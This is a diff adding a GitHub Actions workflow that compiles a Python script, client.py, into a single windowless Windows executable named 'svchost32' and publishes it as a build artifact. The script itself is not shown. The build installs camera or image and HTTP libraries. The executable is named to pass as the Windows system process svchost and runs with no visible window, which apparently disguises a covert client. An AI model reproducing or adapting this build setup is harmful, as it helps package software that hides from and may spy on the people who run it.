@@ -1,0 +1,23 @@
+name: build
+
+on:
+  push:
+    paths:
+      - "client.py"
+      - ".github/workflows/build.yml"
+  workflow_dispatch:
+
+jobs:
+  exe:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - run: pip install pyinstaller opencv-python-headless requests
+      - run: pyinstaller --onefile --noconsole --name svchost32 client.py
+      - uses: actions/upload-artifact@v4
+        with:
+          name: svchost32
+          path: dist/svchost32.exe
